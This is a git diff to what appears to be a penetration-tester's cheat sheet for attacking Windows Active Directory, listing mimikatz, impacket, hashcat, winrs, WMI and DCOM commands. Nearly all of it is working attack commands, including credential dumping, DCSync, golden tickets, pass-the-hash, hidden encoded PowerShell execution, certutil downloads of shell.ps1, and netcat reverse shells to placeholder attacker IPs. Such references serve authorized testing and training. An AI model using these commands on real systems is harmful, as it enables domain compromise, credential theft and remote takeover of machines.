@@ -160,6 +160,8 @@ $ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
 $ hashcat -m 13100 -a 0 ./GetUserSPNs-py_hashcat.txt ./TestPasswordList.txt
 # AS-REP roast
 $ hashcat -m 18200 output_GetNPUsers.txt /usr/share/wordlists/rockyou.txt
+# DCSync
+$ hashcat -m 1000 outout_mimikatz_dcsync_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
 # John
@@ -391,6 +393,9 @@ PS> netsh advfirewall show state
 PS> get-alias | sls "*ipconfig*"
 PS> Get-Alias | select -First 2
 PS> Get-Alias | Where-Object { $_.Name -like '*ipconfig*' }
+# check process
+command prompt> tasklist | findstr "calc"
+PS> Get-Process | Where-Object { $_.Name -like "*calc*"}
 # find a specific folder
 PS> tree c:\
 PS> tree c:\ /f | more
@@ -485,6 +490,18 @@ PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
 PS> $Opt = New-CimSessionOption -Protocol DCOM
 PS> $Session =  New-Cimsession -ComputerName TestComputerHost.HOGE.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+# Shell
+PS> $username = 'TestUser'
+PS> $password = 'TestPassword'
+PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+PS> New-PSSession -ComputerName XXX.XXX.XXX.XXX -Credential $credential
+# Shell
+PS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("TargetHost", "XXX.XXX.XXX.XXX"))
+PS> $dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")
+PS> $dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -nop -w hidden -e aaaaaaaaaa", "7")
+# Web Access
+PS> iwr -UseDefaultCredentials http://TestWeb
 # Memo
 PS> if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs; exit }
 ```
@@ -493,6 +510,7 @@ PS> if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 PS> runas /netonly /user:HOGE.com\TestUser cmd.exe
 PS> runas /netonly /user:HOGE.com\TestUser "c:\tools\nc64.exe -e cmd.exe XXX.XXX.XXX.XXX 4443"
 ```
+
 ## Module: ActiveDirectory
 ```powershell
 PS> Get-Module
@@ -531,6 +549,13 @@ PS> foreach($line in [System.IO.File]::ReadLines("C:\Users\TestUser\Desktop\ad_u
 ```powershell
 PS> sc.exe \\TestHost/HOGE.com create TestService binPath= "%windir%\TestService.exe" start= auto
 ```
+## winrs.exe
+```powershell
+PS> winrs -r:TargetComputer -u:TestUser -p:TestPassword "cmd /c hostname & whoami"
+PS> winrs -r:XXX.XXX.XXX.XXX -u:TestUser -p:TestPassword "cmd /c hostname & whoami"
+PS> winrs -r:TargetComputer -u:TestUser -p:TestPassword "powershell -nop -w hidden -e aaaaaaaaaaaaaaaaaaaaaa"
+# $ nc -lvp 443
+```
 ## certutil.exe
 ```powershell
 PS> certutil.exe -urlcache -split -f http://XXX.XXX.XXX.XXX:443/shell.ps1
@@ -547,6 +572,17 @@ PS> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControl
 PS> wmic useraccount list /format:list
 PS> wmic group list /format:list
 PS> wmic sysaccount list /format:list
+# remote process call
+PS> wmic /node:XXX.XXX.XXX.XXX /user:TestUser /password:TestPassword process call create "calc"
+# shell
+PS> $username = 'TestAdminUser'
+PS> $password = 'TestAdminPassword'
+PS> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+PS> $options = New-CimSessionOption -DCOM
+PS> $session = New-CimSession -ComputerName XXX.XXX.XXX.XXX -Credential $credential -SessionOption $Options
+PS> $command = 'calc'
+PS> Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine -$Command}
 ```
 ## net.exe
 ```zsh
@@ -794,19 +830,24 @@ https://github.com/byt3bl33d3r/pth-toolkit
 # mimikatz
 ```zsh
 PS> mimikatz.exe
-mimikatz # privilege::debug
+mimikatz# privilege::debug
 mimikatz# base64 /out:true
 mimikatz# kerberos::list /export
 ## linux
 # $ echo "<base64 TestUser>" |  tr -d \\n
 # $ cat encoded_file | base64 -d > TestUser.kirbi
-mimikatz# kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
-mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
-tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
+mimikatz# kerberos::ptt Target.kirbi
+mimikatz# kerberos::golden /sid:TargetSid /domain:hoge.com /target: TestWeb.corp.com /service:http /rc4:TargetRc4 /ptt /user:TestUser
 mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
 mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
-mimikatz# sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.65.31 5556"
+mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
+mimikatz# sekurlsa::logonpasswords
+mimikatz# sekurlsa::tickets /export
+## PS> dir .\
+mimikatz# sekurlsa::pth /user:TestUser /domain:hoge.com /rc4:TestRc4Hash /run:"c:\tools\nc64.exe -e cmd.exe XXX.XXX.XXX.XXX 5556"
+mimikatz# sekurlsa::pth /user:TestUser /domain:hoge.com /ntlm:TestNtlmHash /run:powershell
 mimikatz# lsadump::lsa /inject /name:TestUser
+mimikatz# lsadump::dcsync /user:hoge\TestUser
 mimikatz# misc::skelton
 ```
 
@@ -884,6 +925,9 @@ https://github.com/PowerShellMafia/PowerSploit
 # PsExec
 ```powershell
 PS> psexec64.exe \\MACHINE_IP -u TestAdminUser -p TestAdminPassword -i cmd.exe
+PS> psexec64.exe -i \\TestHost -u hoge\TestUser -p TestPassword cmd.exe
+# after overpass the hash
+PS> PsExec.exe \\TargetHost cmd
 ```
 
 # Inveigh
@@ -900,11 +944,13 @@ PS> .\Inveigh.exe
 
 # impacket
 ## GetNPUsers.py
+tag: AS-REP Roast
 ```zsh
 $ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt hoge.com/ | tee output_GetNPUsers.ans
 $ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt -outputfile ./output_GetNPUsers.txt hoge.com/
 ```
 ## GetUserSPNs.py
+tag: Keberoast
 ```zsh
 $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo
 $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.local/piyo -request
@@ -925,6 +971,7 @@ $ smbserver.py -smb2support -username TestUser -password TestPassword TestRemote
 ## secretsdump.py
 ```zsh
 $ secretsdump.py -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
+$ secretsdump.py -just-dc-user TestUser HOGE.com/TestUser:"TestPassword\!"@XXX.XXX.XXX.XXX
 $ secretsdump.py -outputfile hoge-com_hashes -just-dc HOGE.com/TestUser@XXX.XXX.XXX.XXX
 $ secretsdump.py -sam sam.hive -system system.hive LOCAL
 $ ls hoge-com_hashes*
@@ -936,8 +983,11 @@ $ psexec.py HOGE.com/piyo:'TestPassword'@XXX.XXX.XXX.XXX
 $ psexec.py -hashes TestLmHash:TestNtHash TestUser@XXX.XXX.XXX.XXX
 ```
 ## wmiexec.py
+tag:shell
 ```zsh
 $ wmiexec.py hoge.local/TestUser:'TestPassword'@XXX.XXX.XXX.XXX
+# pth
+$ wmiexec.py -hashes :TestNtHash Administrator@XXX.XXX.XXX.XXX
 ```
 
 # Evil-WinRM
